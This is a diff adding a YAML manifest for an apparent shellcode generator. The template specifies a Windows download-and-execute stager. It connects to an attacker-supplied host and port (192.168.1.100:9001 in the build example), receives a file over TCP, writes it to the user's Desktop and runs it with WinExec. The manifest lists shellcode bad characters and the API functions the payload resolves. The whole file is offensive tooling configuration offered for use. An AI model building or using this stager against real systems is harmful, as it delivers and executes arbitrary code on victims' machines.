@@ -1,0 +1,23 @@
+template: ir_tcp_download_to_userpath
+# IR workflow: build user Desktop path, TCP recv, write-to-disk, WinExec.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_tcp_download_to_userpath.yaml \
+#       --lhost 192.168.1.100 --lport 9001 \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - GetUserNameA
+  - WSAStartup
+  - WSASocketA
+  - connect
+  - recv
+  - closesocket
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+  - ExitProcess
